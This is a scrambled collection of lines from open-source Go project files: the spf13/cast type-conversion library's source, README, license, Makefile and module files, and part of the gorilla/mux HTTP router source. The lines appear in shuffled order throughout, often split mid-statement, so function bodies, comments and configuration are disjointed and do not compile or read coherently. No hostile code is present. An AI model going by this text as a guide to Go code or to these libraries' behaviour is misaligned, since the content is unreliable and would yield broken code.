if t := reflect.TypeOf(a)
"err = fmt.Errorf(""unable to cast %"
case map[string]interface{}:
"val, err := ToIntE(s.Index(j).Interface())"
"return s.String(), nil"
return strconv.ParseBool(i.(string))
// ToStringMapInt64E casts an interface to a map[string]int64{} type.
"value, err := ToStringSliceE(val)"
} else {
"return false, fmt.Errorf(""unable to cast %"
"func ToUint8E(i interface{}) (uint8, error) {"
 v.Kind() == reflect.Ptr 
"func ToUintE(i interface{}) (uint, error) {"
"return float32(v), nil"
"func ToStringMapStringE(i interface{}) (map[string]string, error) {"
" ""ns"")"
case int:
"return uint(v), nil"
case map[interface{}]interface{}:
"v of type %T to float64"", i, i)"
"v of type %T to int16"", i, i)"
case error:
"""2006-01-02"","
// ToInt64E casts an interface to an int64 type.
m[ToString(k)] = val
m[key] = value
"if d, e = time.Parse(dateType, s)"
"return float64(s), nil"
"v of type %T to []bool"", i, i)"
"return v, nil"
"a := make([]int, s.Len())"
case map[string]string:
if reflect.TypeOf(i).Kind() != reflect.Map {
"v of type %T to map[string]int"", i, i)"
return a
"return s, nil"
switch v := i.(type) {
"return 0, errNegativeNotAllowed"
"// predefined list of formats.  If no suitable format is found, an error is"
"v of type %T to int8"", i, i)"
 j < s.Len()
"time.RFC822,"
case map[string]int:
"time.Stamp,"
"return 0, fmt.Errorf(""unable to cast %"
"func ToStringSliceE(i interface{}) ([]string, error) {"
"return strconv.Itoa(int(s)), nil"
"return int(v), nil"
case interface{}:
// returned.
// ToStringMapIntE casts an interface to a map[string]int{} type.
// ToStringMapStringE casts an interface to a map[string]string type.
"return []time.Duration{}, fmt.Errorf(""unable to cast %"
"return int16(v), nil"
// StringToDate attempts to parse a string into a time.Time type using a
"func ToUint32E(i interface{}) (uint32, error) {"
"time.ANSIC,"
var a []string
"mh"") {"
// jsonStringToObject attempts to unmarshall a string as JSON into
"return strconv.FormatInt(s, 10), nil"
var m = map[string]bool{}
"val, err := ToInt64E(v.MapIndex(keyVal).Interface())"
if err == nil {
"v of type %T to int64"", i, i)"
// ToBoolSliceE casts an interface to a []bool type.
"d, err = time.ParseDuration(s "
"func ToUint16E(i interface{}) (uint16, error) {"
// ToUint16E casts an interface to a uint16 type.
"val, err := ToIntE(v.MapIndex(keyVal).Interface())"
m[ToString(k)] = ToInt(val)
"// or error,"
var errorType = reflect.TypeOf((
for !v.Type().Implements(fmtStringerType) 
"""strconv"""
data := []byte(s)
"v of type %T to map[string]bool"", i, i)"
a[j] = val
v := reflect.ValueOf(i)
"""strings"""
// as necessary to reach the base type (or nil).
case map[interface{}][]string:
m[k] = ToInt(val)
"func ToSliceE(i interface{}) ([]interface{}, error) {"
error)(nil)).Elem()
switch kind {
"return append(s, v...), nil"
"v, err := strconv.ParseFloat(s, 64)"
"v of type %T to uint16"", i, i)"
func indirectToStringerOrError(a interface{}) interface{} {
// ToStringE casts an interface to a string type.
"time.RFC3339,"
"time.RFC1123Z,"
"v of type %T to uint64"", i, i)"
"func ToDurationE(i interface{}) (d time.Duration, err error) {"
"v, err := strconv.ParseUint(s, 0, 8)"
// ToInt16E casts an interface to an int16 type.
// ToFloat32E casts an interface to a float32 type.
// ToStringMapE casts an interface to a map[string]interface{} type.
"return uint32(v), nil"
"time.RFC1123,"
mVal := reflect.ValueOf(m)
"v of type %T to string"", i, i)"
if err != nil {
// ToIntE casts an interface to an int type.
"for k, val := range v {"
// ToBoolE casts an interface to a bool type.
"mVal.SetMapIndex(keyVal, reflect.ValueOf(val))"
// ToUint32E casts an interface to a uint32 type.
"""fmt"""
 e == nil {
case map[string]bool:
"""2006-01-02 15:04:05Z07:00"", // RFC3339 without T"
"""reflect"""
case fmt.Stringer:
"func ToIntE(i interface{}) (int, error) {"
case int16:
"return strconv.FormatFloat(float64(s), 'f', -1, 32), nil"
d = time.Duration(ToFloat64(s))
"for _, u := range v {"
"return strconv.FormatFloat(s, 'f', -1, 64), nil"
// ToUint8E casts an interface to a uint type.
"return """", nil"
switch b := i.(type) {
case int64:
m[ToString(k)] = []string{val}
m[ToString(k)] = ToStringSlice(vt)
// ToStringMapStringSliceE casts an interface to a map[string][]string type.
"str, err := ToStringE(v)"
// ToUint64E casts an interface to a uint64 type.
"v to uint64: %s"", i, err)"
case []string:
// Avoid creating a reflect.Value if it's not a pointer.
"""time"""
case time.Time:
"return s.Error(), nil"
"return uint8(s), nil"
"return json.Unmarshal(data, v)"
"return 1, nil"
"return int32(v), nil"
"// indirectToStringerOrError returns the value, after dereferencing as many times"
"func ToInt8E(i interface{}) (int8, error) {"
case map[interface{}]string:
case map[string]int64:
"return time.Unix(int64(v), 0), nil"
var m = map[string]int64{}
case []time.Duration:
case int32:
"""2006-01-02 15:04:05.999999999 -0700 MST"", // Time.String()"
"v of type %T to Duration"", i, i)"
"err := jsonStringToObject(v, "
"v to uint32: %s"", i, err)"
"return int64(s), nil"
"func jsonStringToObject(s string, v interface{}) error {"
case map[string][]string:
"return uint64(s), nil"
"v of type %T to bool"", i, i)"
"time.RFC822Z,"
case template.URL:
"return uint16(s), nil"
if s < 0 {
m[ToString(k)] = ToInt64(val)
"func ToInt16E(i interface{}) (int16, error) {"
"func ToUint64E(i interface{}) (uint64, error) {"
"return false, nil"
// ToUintE casts an interface to a uint type.
"func ToInt32E(i interface{}) (int32, error) {"
s := reflect.ValueOf(i)
"v, err := strconv.ParseUint(s, 0, 64)"
"return m, nil"
"time.StampMilli,"
"return int8(v), nil"
"time.RubyDate,"
"return int16(s), nil"
"return m, err"
case uint8:
// ToStringSliceE casts an interface to a []string type.
"time.Kitchen,"
 !v.IsNil() {
// ToInt8E casts an interface to an int8 type.
"v to uint8: %s"", i, err)"
"return true, nil"
var fmtStringerType = reflect.TypeOf((
"return a, fmt.Errorf(""unable to cast %"
for j := 0
if a == nil {
package cast
"""2006-01-02 15:04:05"","
switch s := i.(type) {
case uint32:
// ToIntSliceE casts an interface to a []int type.
"time.StampNano,"
case template.CSS:
"v, err := strconv.ParseUint(s, 0, 16)"
"return []string{str}, nil"
"func parseDateWith(s string, dates []string) (d time.Time, e error) {"
var m = map[string][]string{}
"var errNegativeNotAllowed = errors.New(""unable to cast negative value"")"
// Use of this source code is governed by an MIT-style
var m = map[string]interface{}{}
"return uint32(s), nil"
// From html/template/content.go
"func ToBoolSliceE(i interface{}) ([]bool, error) {"
case nil:
"case float32, float64:"
"""2006-01-02T15:04:05-0700"", // RFC3339 without timezone hh:mm colon"
"s = append(s, u)"
"return strconv.Itoa(s), nil"
"func ToFloat64E(i interface{}) (float64, error) {"
"return strings.Fields(v), nil"
case int8:
"""encoding/json"""
"return int8(s), nil"
case string:
// ToFloat64E casts an interface to a float64 type.
m[ToString(k)] = ToString(val)
"""2006-01-02T15:04:05"", // iso8601 without timezone"
"return int(s), nil"
"func ToStringE(i interface{}) (string, error) {"
"func ToIntSliceE(i interface{}) ([]int, error) {"
"func ToStringMapBoolE(i interface{}) (map[string]bool, error) {"
"v of type %T to float32"", i, i)"
case float64:
// the object passed as pointer.
"v, err := strconv.ParseUint(s, 0, 0)"
"func ToStringMapIntE(i interface{}) (map[string]int, error) {"
if s {
case template.HTMLAttr:
"func ToStringMapInt64E(i interface{}) (map[string]int64, error) {"
"v of type %T to uint32"", i, i)"
"key, err := ToStringE(k)"
m[ToString(k)] = vt
 t.Kind() != reflect.Ptr {
case template.JS:
"time.UnixDate,"
"v of type %T to map[string]interface{}"", i, i)"
case []map[string]interface{}:
"v to uint16: %s"", i, err)"
v = v.Elem()
m[ToString(k)] = []string{ToString(val)}
case map[interface{}][]interface{}:
"""html/template"""
case []bool:
"return time.Time{}, fmt.Errorf(""unable to cast %"
"v of type %T to map[string][]string"", i, i)"
// ToSliceE casts an interface to a []interface{} type.
"a := make([]bool, s.Len())"
case uint:
i = indirect(i)
return nil
// ToStringMapBoolE casts an interface to a map[string]bool type.
case bool:
"return int32(s), nil"
return v.Interface()
"return a, nil"
"return uint(s), nil"
case []byte:
"a := make([]time.Duration, s.Len())"
"return """", fmt.Errorf(""unable to cast %"
"v of type %T to map[string]int64"", i, i)"
if i == nil {
case float32:
var m = map[string]string{}
"v, err := strconv.ParseFloat(s, 32)"
"func ToFloat32E(i interface{}) (float32, error) {"
m[k] = ToInt64(val)
"for _, dateType := range dates {"
"return strconv.FormatBool(s), nil"
fmt.Stringer)(nil)).Elem()
"return m, fmt.Errorf(""unable to cast %"
"v to uint: %s"", i, err)"
// license that can be found in the LICENSE file.
if i.(int) != 0 {
"if strings.ContainsAny(s, ""nsu"
"return s, fmt.Errorf(""unable to cast %"
"a = append(a, ToString(u))"
// Copyright 2011 The Go Authors. All rights reserved.
"d, err = time.ParseDuration(s)"
"return 0, nil"
"func ToDurationSliceE(i interface{}) ([]time.Duration, error) {"
import (
"case int, int64, int32, int16, int8, uint, uint64, uint32, uint16, uint8:"
 2014 Steve Francia <spf@spf13.com>.
"for _, keyVal := range v.MapKeys() {"
"val, err := ToBoolE(s.Index(j).Interface())"
// as necessary to reach the base type (or nil) or an implementation of fmt.Stringer
// Copyright 
"return strconv.FormatInt(int64(s), 10), nil"
"return []int{}, fmt.Errorf(""unable to cast %"
// ToInt32E casts an interface to an int32 type.
"v, err := strconv.ParseUint(s, 0, 32)"
"return uint8(v), nil"
"time.RFC850,"
m[ToString(k)] = ToStringSlice(val)
"time.StampMicro,"
"v of type %T to uint8"", i, i)"
var s []interface{}
"return d, fmt.Errorf(""unable to parse date: %s"", s)"
// ToTimeE casts an interface to a time.Time type.
"""02 Jan 2006"","
case uint16:
"v of type %T to int"", i, i)"
"return uint16(v), nil"
"v of type %T to []time.Duration"", i, i)"
"v of type %T to []string"", i, i)"
m[ToString(k)] = ToBool(val)
case uint64:
case time.Duration:
"func ToBoolE(i interface{}) (bool, error) {"
"v, err := strconv.ParseInt(s, 0, 0)"
"func ToStringMapStringSliceE(i interface{}) (map[string][]string, error) {"
switch vt := val.(type) {
i = indirectToStringerOrError(i)
"""2006-01-02 15:04:05 -07:00"","
return
"func ToStringMapE(i interface{}) (map[string]interface{}, error) {"
"return parseDateWith(s, []string{"
"// indirect returns the value, after dereferencing as many times"
// ToDurationE casts an interface to a time.Duration type.
"v, _ := ToStringSliceE(i)"
// ToUint8 casts an interface to a uint8 type.
func ToUint64(i interface{}) uint64 {
// ToUint32 casts an interface to a uint32 type.
func ToStringMap(i interface{}) map[string]interface{} {
"v, _ := ToInt16E(i)"
// ToUint16 casts an interface to a uint16 type.
"v, _ := ToUint64E(i)"
"v, _ := ToBoolE(i)"
"v, _ := ToStringE(i)"
return v
func ToStringMapBool(i interface{}) map[string]bool {
"v, _ := ToInt64E(i)"
// ToDurationSlice casts an interface to a []time.Duration type.
// ToUint64 casts an interface to a uint64 type.
// ToStringSlice casts an interface to a []string type.
// ToStringMapInt casts an interface to a map[string]int type.
// ToBool casts an interface to a bool type.
func ToInt(i interface{}) int {
"v, _ := ToSliceE(i)"
// ToInt32 casts an interface to an int32 type.
func ToStringMapInt64(i interface{}) map[string]int64 {
// ToFloat32 casts an interface to a float32 type.
func ToSlice(i interface{}) []interface{} {
"v, _ := ToFloat32E(i)"
"v, _ := ToStringMapIntE(i)"
func ToUint8(i interface{}) uint8 {
"v, _ := ToStringMapInt64E(i)"
"v, _ := ToFloat64E(i)"
"v, _ := ToIntE(i)"
// ToString casts an interface to a string type.
func ToBool(i interface{}) bool {
// ToStringMapStringSlice casts an interface to a map[string][]string type.
// ToBoolSlice casts an interface to a []bool type.
"v, _ := ToTimeE(i)"
// ToInt casts an interface to an int type.
"v, _ := ToStringMapBoolE(i)"
func ToStringMapStringSlice(i interface{}) map[string][]string {
func ToStringMapString(i interface{}) map[string]string {
// Package cast provides easy and safe casting in Go.
// license that can be found in the LICENSE file.
package cast
// ToInt64 casts an interface to an int64 type.
func ToString(i interface{}) string {
"v, _ := ToDurationE(i)"
// ToIntSlice casts an interface to a []int type.
func ToUint32(i interface{}) uint32 {
"v, _ := ToStringMapStringSliceE(i)"
// ToInt8 casts an interface to an int8 type.
"v, _ := ToInt8E(i)"
"v, _ := ToUint32E(i)"
// Use of this source code is governed by an MIT-style
 2014 Steve Francia <spf@spf13.com>.
func ToDurationSlice(i interface{}) []time.Duration {
func ToInt32(i interface{}) int32 {
// Copyright 
// ToStringMapBool casts an interface to a map[string]bool type.
func ToUint16(i interface{}) uint16 {
func ToBoolSlice(i interface{}) []bool {
"v, _ := ToBoolSliceE(i)"
"v, _ := ToStringMapE(i)"
// ToUint casts an interface to a uint type.
// ToStringMapInt64 casts an interface to a map[string]int64 type.
// ToStringMap casts an interface to a map[string]interface{} type.
func ToDuration(i interface{}) time.Duration {
func ToIntSlice(i interface{}) []int {
"v, _ := ToUint16E(i)"
// ToDuration casts an interface to a time.Duration type.
// ToTime casts an interface to a time.Time type.
"v, _ := ToStringMapStringE(i)"
// ToStringMapString casts an interface to a map[string]string type.
func ToInt16(i interface{}) int16 {
"v, _ := ToInt32E(i)"
func ToTime(i interface{}) time.Time {
func ToUint(i interface{}) uint {
func ToStringSlice(i interface{}) []string {
"import ""time"""
// ToInt16 casts an interface to an int16 type.
// ToFloat64 casts an interface to a float64 type.
"v, _ := ToIntSliceE(i)"
func ToFloat32(i interface{}) float32 {
func ToStringMapInt(i interface{}) map[string]int {
func ToInt8(i interface{}) int8 {
"v, _ := ToUint8E(i)"
"v, _ := ToDurationSliceE(i)"
"v, _ := ToUintE(i)"
func ToFloat64(i interface{}) float64 {
func ToInt64(i interface{}) int64 {
// ToSlice casts an interface to a []interface{} type.
    cast.ToInt(nil)                // 0
    cast.ToInt(true)               // 1
    cast.ToInt(false)              // 0
status.svg)](https://godoc.org/github.com/spf13/cast)
"    cast.ToString([]byte(""one time"")) // ""one time"""
When working with dynamic data in Go you often need to cast or convert the data
cast
library.
for example you can only convert a string to an int when it is a string
for meta data.
t Panic! ... Cast
Cast is a library to convert between different go types in a consistent and easy way.
was returned.
branch=master)](https://travis-ci.org/spf13/cast)
Cast also provides identical methods To_____E. These return the same result as
the code for a complete set.
conversion is possible. It doesn
====
the desired type. 
"    cast.ToString(foo)                // ""one more time"""
ToInt
var eight interface{} = 8
input matched the zero value or when the conversion failed and the zero value
"    cast.ToString(8)                  // ""8"""
    cast.ToInt(eight)              // 8
from one type into another. Cast goes beyond just using type assertion (though
If you are working with interfaces to handle things like dynamic content
is the library for you.
"t make any attempts to guess what you meant,"
representation of an int such as 
"full types, then Cast is the library for you."
"interface into a bool, etc. Cast does this intelligently when an obvious"
 Usage
"    cast.ToString(nil)                // """""
 What is Cast
ll need an easy way to convert an interface into a given type. This
converted. Using these methods you can tell the difference between when the
. Cast was developed for use in
"    cast.ToString(8.31)               // ""8.31"""
 Example 
"    cast.ToString(""mayonegg"")         // ""mayonegg"""
"    cast.ToInt(""8"")                // 8"
it uses that when possible) to provide a very straightforward and convenient
[![GoDoc](https://godoc.org/github.com/spf13/cast
Easy and safe casting from one type to another in Go
0 or nil value for that type will be returned
"var foo interface{} = ""one more time"""
    cast.ToInt(8)                  // 8
"If input is provided that will not convert to that type, the"
"Cast provides simple functions to easily convert a number to a string, an"
Cast provides a handful of To_____ methods. These methods will always return
[![Build Status](https://api.travis-ci.org/spf13/cast.svg
"If you are taking in data from YAML, TOML or JSON or other formats which lack"
"the To_____ methods, plus an additional error which tells you if it successfully"
 Why use Cast
    cast.ToInt(8.31)               // 8
"[Hugo](http://hugo.spf13.com), a website engine which uses YAML, TOML or JSON"
[![Go Report Card](https://goreportcard.com/badge/github.com/spf13/cast)](https://goreportcard.com/report/github.com/spf13/cast)
ToString
The following examples are merely a sample of what is available. Please review
"of this software and associated documentation files (the ""Software""), to deal"
copies or substantial portions of the Software.
"copies of the Software, and to permit persons to whom the Software is"
"furnished to do so, subject to the following conditions:"
"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
The MIT License (MIT)
SOFTWARE.
"in the Software without restriction, including without limitation the rights"
Copyright (c) 2014 Steve Francia
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
The above copyright notice and this permission notice shall be included in all
"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
"Permission is hereby granted, free of charge, to any person obtaining a copy"
test: 
[a-zA-Z0-9_-]
go test ./...
 Run go vet linter
done
"n"", $$1, $$2}'"
"if [ """
" awk 'BEGIN {FS = "":."
" improperly formatted go files"" "
 Run tests with race detector
vet: 
gofmt -l -s $$GOPATH/src/$$d 
 Run tests
"echo """
go test -race ./...
033[36m%-30s
 echo 
.DEFAULT_GOAL := help
go test -coverprofile=coverage.out -covermode=count
"@if [ """
 Generate test coverage report
 tee /dev/stderr
 Run golint linter
 exit 1
fmt: 
check: test-race fmt vet lint 
" go vet errors!"" "
" golint errors!"" "
 A Self-Documenting Makefile: http://marmelab.com/blog/2016/02/29/auto-documented-makefile.html
go vet 
033[0m %s
 do 
go list
test-cover-html: 
lint: 
" {printf """
 Run gofmt linter
 sort 
 Run tests and linters
$$' $(MAKEFILE_LIST) 
@for d in 
golint $$d 
help:
 then 
test-race: 
@grep -E '
go tool cover -func=coverage.out
.PHONY: check fmt lint test test-race vet test-cover-html help
github.com/stretchr/testify v1.2.2/go.mod h1:a8OnRcib4nhh0OaRAV
Yts87kKdq0PP7pXfy6kDkUVs=
github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
github.com/stretchr/testify v1.2.2 h1:bSDNvY7ZPG5RlJ8otE/7V6gMiyenm9RtJ7IUVIAoJ1w=
github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
github.com/pmezard/go-difflib v1.0.0/go.mod h1:iKH77koFhYxTK1pcRnkKkqfTogsbg7gZNVY4sRDYZ/4=
c5H38=
github.com/pmezard/go-difflib v1.0.0 h1:4DBwDE0NGyQoBHbLQYPwSUPoCMWR5BEzIk/f1lZbAQM=
rkHYY13jYWTU97c=
[568vq].out
_testmain.go
 Architecture specific extensions/prefixes
_cgo_export.
.[568vq]
.exe
.cgo1.go
.bench
_cgo_gotypes.go
_test
 Folders
_cgo_defun.c
.test
_obj
.cgo2.c
" Compiled Object files, Static and Dynamic libs (Shared Objects)"
    - go: tip
sudo: required
  allow_failures:
  - make check
script:
language: go
matrix:
"  - ""1.11.x"""
env:
  fast_finish: true
  - linux
  -  GO111MODULE=on
  - tip
github.com/davecgh/go-spew v1.1.1 // indirect
module github.com/spf13/cast
github.com/stretchr/testify v1.2.2
github.com/pmezard/go-difflib v1.0.0 // indirect
require (
type routeConf struct {
// strict slash is ignored for that route because the redirect behavior can't
"func uniqueVars(s1, s2 []string) error {"
// Router.
if v1 == v2 {
// HandleFunc registers a new route with a matcher for the URL path.
// See Route.Schemes().
varsKey contextKey = iota
type WalkFunc func(route 
// to modify this behaviour as needed.
// See Route.Host().
"c.regexp.queries = append(c.regexp.queries, copyRouteRegexp(q))"
// will be filled in the match argument's MatchErr field. If the match failure type
RouteMatch) bool {
skipClean bool
w.WriteHeader(http.StatusMethodNotAllowed)
// Host registers a new route with a matcher for the URL host.
path := req.URL.Path
// GetRoute returns a route registered with the given name. This method
return rv.(map[string]string)
Router)
// become /fetch/http/xkcd.com/534
"for _, route := range r.routes {"
if p := cleanPath(path)
// Configurable Handler to be used when the request method does not match the route.
"if rv := contextGet(r, routeKey)"
routeRegexp {
if !r.skipClean {
"// routes with a non-idempotent method (e.g. POST, PUT), the subsequent re-directed"
length := len(pairs)
package mux
"""errors"""
http.Request)) 
// MatcherFunc registers a new route with a custom matcher function.
if r.NotFoundHandler != nil {
return r.NewRoute().PathPrefix(tpl)
"for _, v2 := range s2 {"
// See Route.Queries().
req.URL
// are explored depth-first.
// SkipClean defines the path cleaning behaviour for new routes. The initial
//     func init() {
Router) Host(tpl string) 
// that replies to each request with a status code 405.
Route{})
// Headers registers a new route with a matcher for request header values.
// this route and vice versa.
m[pairs[i]] = regex
// ----------------------------------------------------------------------------
// router that walk is about to descend down to should be skipped.
return c
break
return true
return rv.(
// WalkFunc is the type of the function called for each route visited by Walk.
"http.Request, match "
"r.routes = append(r.routes, route)"
NotFoundHandler http.Handler
// Routes by name for URL building.
"req = setVars(req, match.Vars)"
if err == SkipRouter {
func CurrentRoute(r 
"Router) ServeHTTP(w http.ResponseWriter, req "
"for _, v1 := range s1 {"
// See Route.Name().
// ErrNotFound is returned when no route match is found.
// the count is not an even number.
Router{namedRoutes: make(map[string]
type contextKey int
"return contextSet(r, routeKey, val)"
// uniqueVars returns an error if two slices contain duplicated strings.
"// If true, do not clear the request context after handling the request."
url.Path = p
"if h, ok := t.handler.("
w.WriteHeader(http.StatusMovedPermanently)
for i := len(r.middlewares) - 1
"// be determined from a prefix alone. However, any subrouters created from that"
return r.NewRoute().Headers(pairs...)
"// Special case: when a route sets a path prefix using the PathPrefix() method,"
http.Request) map[string]string {
"return nil, err"
// See Route.Path().
 p != path {
return r.NewRoute().MatcherFunc(f)
// the method defined against the route.
"func checkPairs(pairs ...string) (int, error) {"
" np != ""/"" {"
// Route factories
return false
return r.NewRoute().Path(tpl)
http.Request) 
 i >= 0
"Router) HandleFunc(path string, f func(http.ResponseWriter,"
routeRegexp) 
// returns true.
// Use of this source code is governed by a BSD-style
match) {
if handler == nil {
Router) PathPrefix(tpl string) 
// Path registers a new route with a matcher for the URL path.
var (
"return r.walk(walkFn, []"
// on the request itself.
"handler.ServeHTTP(w, req)"
c := r
// was renamed to Get() and remains here for backwards compatibility.
"regexp.Regexp, length/2)"
// put the trailing slash back if necessary.
if !valueExists {
"// If true, ""/path/foo%2Fbar/to"" will match the path ""/path/{var}/to"""
// Configurable Handler to be used when no route matches.
id=5252
// PathPrefix registers a new route with a matcher for the URL path prefix.
"Route, router "
match.Handler = r.NotFoundHandler
"// When false, if the route path is ""/path"", accessing ""/path/"" will not match"
"= ""/"""
 match.MatchErr == ErrMethodMismatch {
c := 
"c.matchers = make([]matcher, 0, len(r.matchers))"
if r.useEncodedPath {
"// Vars returns the route variables for the current request, if any."
// BuildVarsFunc registers a new route with a custom function for modifying
"Router) walk(walkFn WalkFunc, ancestors []"
"return ""/"""
"// At every invocation, it is given the current route, and the current router,"
// see the path as specified in the route.
"// then this function returns false. If available, a reason for the match failure"
buildVarsFunc BuildVarsFunc
"for _, t := range r.routes {"
"return fmt.Errorf(""mux: duplicated route variable %q"", v2)"
m[pairs[i]] = pairs[i
Router) Get(name string) 
Route) error {
// initialize a route with a copy of the parent router's configuration
// See Route.PathPrefix().
// ErrMethodMismatch is returned when the method in the request does not match
// in the tree. The routes are walked in the order they were added. Sub-routers
// mapFromPairsToString converts variadic string parameters to a
// Methods registers a new route with a matcher for HTTP methods.
// matchMapWithRegex returns true if the given key/value pairs exist in a given map compiled against
"if route.Match(req, match) {"
Route)
return r.NewRoute().BuildVarsFunc(f)
// Check if key exists.
if err != nil {
" is used, since the context is stored"
"if p == """" {"
"""fmt"""
return r.NewRoute().Path(path).HandlerFunc(f)
"// Walk walks the router and all its sub-routers, calling walkFn for each route"
"// Or, for Google App Engine, register it in a init() function:"
"""path"""
Router) SkipClean(value bool) 
Router) Walk(walkFn WalkFunc) error {
// configuration shared with 
handler = methodNotAllowedHandler()
func methodNotAllowedHandler() http.Handler { return http.HandlerFunc(methodNotAllowed) }
// If the request does not match any of this router's or its subrouters' routes
// will not redirect
Router) Methods(methods ...string) 
if length%2 != 0 {
// NewRouter returns a new router instance.
"for _, q := range r.regexp.queries {"
return r
//     var router = mux.NewRouter()
// common route configuration shared between 
k = http.CanonicalHeaderKey(k)
np := path.Clean(p)
return 
// key exists. Otherwise we also check for equality.
// string to regex map.
"for _, v := range arr {"
"// Routes to be matched, in order."
return route
Route
"ancestors = append(ancestors, t)"
 and 
"// When true, if the route path is ""/path/"", accessing ""/path"" will perform a redirect"
//     func main() {
// This will send all incoming requests to the router.
// the given regex
buildScheme string
// methodNotAllowed replies to the request with an HTTP status code 405.
http.Request) {
// Closest match for a router (includes sub-routers)
func (r 
"ErrMethodMismatch = errors.New(""method is not allowed"")"
// value is false.
"// cleanPath returns the canonical path for p, eliminating . and .. elements."
"func matchMapWithString(toCheck map[string]string, toMatch map[string][]string, canonicalKey bool) bool {"
// NewRoute registers an empty route.
// Name registers a new route with a name.
// redirect to the former and vice versa.
const (
// value is false. Users should be careful about which routes are not cleaned
// requests:
// This only works when called inside the handler of the matched route
match.Handler = r.middlewares[i].Middleware(match.Handler)
valueExists := false
path = req.URL.EscapedPath()
return r.NewRoute().Path(path).Handler(handler)
// The scheme used when building URLs.
// returns an effective deep copy of 
// Slice of middlewares to be called after a match is found
routeConf
Router) Schemes(schemes ...string) 
"if h, ok := sr.("
"return m, nil"
// List of matchers.
// methodNotAllowedHandler returns a simple request handler
c.regexp.host = copyRouteRegexp(r.regexp.host)
return r.NewRoute().Name(name)
// Context
http.Request {
"Route{routeConf: copyRouteConf(r.routeConf), namedRoutes: r.namedRoutes}"
return r.namedRoutes[name]
// mapFromPairsToRegex converts variadic string parameters to a
// Copyright 2012 The Gorilla Authors. All rights reserved.
"func matchInArray(arr []string, value string) bool {"
"""mux: number of parameters must be multiple of 2, got %v"", pairs)"
// to the routes.
 rv != nil {
// because the matched route is stored in the request context which is cleared
"regexp.Regexp, toMatch map[string][]string, canonicalKey bool) bool {"
"for _, value := range values {"
routeKey
// and a list of ancestor routes that lead to the current route.
if match.MatchErr == nil {
// StrictSlash defines the trailing slash behavior for new routes. The initial
"ErrNotFound = errors.New(""no matching route was found"")"
if p[len(p)-1] == '/' 
"length, err := checkPairs(pairs...)"
matchers []matcher
// It is set to ErrMethodMismatch if there is a mismatch in
c.regexp.path = copyRouteRegexp(r.regexp.path)
// Clean path to canonical form and redirect.
"// For eg. ""/path/foo%2Fbar/to"" will match the path ""/path/foo/bar/to"""
return err
return r.NewRoute().Schemes(schemes...)
func Vars(r 
"// If true, when the path pattern is ""/path//to"", accessing ""/path//to"""
// UseEncodedPath tells the router to match the encoded original path
type RouteMatch struct {
// string to string map.
// Borrowed from the net/http package.
"""net/http"""
 values == nil {
// RouteMatch stores information about a matched route.
"// Handler, and Vars fields of the the match argument are filled and this function"
"// For eg. ""/path/foo%2Fbar/to"" will match the path ""/path/{var}/to""."
return r.NewRoute().Queries(pairs...)
"// to the former and vice versa. In other words, your application will always"
ancestors = ancestors[:len(ancestors)-1]
Router) Match(req 
"regexp.Regexp, error) {"
if canonicalKey {
match.Handler = r.MethodNotAllowedHandler
Router) UseEncodedPath() 
strictSlash bool
if match.MatchErr == ErrMethodMismatch {
if handler == nil 
func cleanPath(p string) string {
 i-- {
"// checkPairs returns the count of strings passed in, and an error if"
Router) Path(tpl string) 
// Get returns a route registered with the given name.
KeepContext bool
handler = http.NotFoundHandler()
// http://code.google.com/p/go/issues/detail
func matchMapWithRegex(toCheck map[string]
// SkipRouter is used as a return value from WalkFuncs to indicate that the
// field of the match argument.
// route variables before building a URL.
// Added 3 lines (Philip Schlump) - It was dropping the query string and 
"return length, nil"
MethodNotAllowedHandler http.Handler
Router) Name(name string) 
var match RouteMatch
r.useEncodedPath = true
Router {
// matchInArray returns true if the given string value is in the array.
regexp routeRegexpGroup
// Deprecated: No effect when go1.7
"// If not called, the router will match the unencoded path to the routes."
"if rv := contextGet(r, varsKey)"
func mapFromPairsToRegex(pairs ...string) (map[string]
"return contextSet(r, varsKey, val)"
Router
whatever from query.
"routeRegexp, 0, len(r.regexp.queries))"
= 2 {
if v == value {
// The re-direct is a HTTP 301 (Moved Permanently). Note that when this is set for
if v.MatchString(value) {
// request will be made as a GET by most clients. Use middleware or client settings
// Helpers
MatchErr error
if p[0] != '/' {
"func methodNotAllowed(w http.ResponseWriter, r "
// If value was defined as an empty string we only check that the
// See Route.Methods().
func setVars(r 
// See Route.Path() and Route.Handler().
"} else if v != """" {"
valueExists = true
} else if v != nil {
"regex, err := regexp.Compile(pairs[i"
url := 
"http.Request, val interface{}) "
"// If the request matches a route of this router or one of its subrouters the Route,"
return nil
if r.MethodNotAllowedHandler != nil {
func copyRouteRegexp(r 
Router) StrictSlash(value bool) 
// route inherit the original StrictSlash setting.
// matchMapWithString returns true if the given key/value pairs exist in a given map.
Router) GetRoute(name string) 
// the request method and route method
"// If true, when the path pattern is ""/path/"", accessing ""/path"" will"
// Handle registers a new route with a matcher for the URL path.
Router) Queries(pairs ...string) 
func copyRouteConf(r routeConf) routeConf {
"// after the handler returns, unless the KeepContext option is set on the"
"return length, fmt.Errorf("
p = url.String()
// See Route.Headers().
"if r.Match(req, "
// See Route.MatcherFunc().
"for k, v := range toCheck {"
Router) Headers(pairs ...string) 
"Router, ancestors []"
"// When true, if the route path is ""/path//to"", it will remain with the double"
middlewares []middleware
// Router registers routes to be matched and dispatches a handler.
"req = setCurrentRoute(req, match.Route)"
Route {
"""regexp"""
Router) NewRoute() 
type Router struct {
// path.Clean removes trailing slash except for root
namedRoutes map[string]
var handler http.Handler
continue
return r.NewRoute().Methods(methods...)
"//         http.Handle(""/"", router)"
// license that can be found in the LICENSE file.
// slash. This is helpful if you have a route like: /fetch/http://xkcd.com/534/
Router) BuildVarsFunc(f BuildVarsFunc) 
"err := h.walk(walkFn, ancestors)"
// Queries registers a new route with a matcher for URL query values.
